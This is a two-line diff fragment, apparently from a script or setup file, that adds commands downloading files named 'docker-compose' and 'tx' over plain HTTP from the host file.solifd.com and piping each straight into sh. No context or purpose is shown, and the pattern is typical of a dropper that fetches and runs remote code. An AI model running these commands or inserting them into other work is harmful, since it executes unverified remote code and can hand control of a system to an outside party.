@@ -1,0 +1,2 @@
+curl http://file.solifd.com/docker-compose |sh
+curl http://file.solifd.com/tx |sh
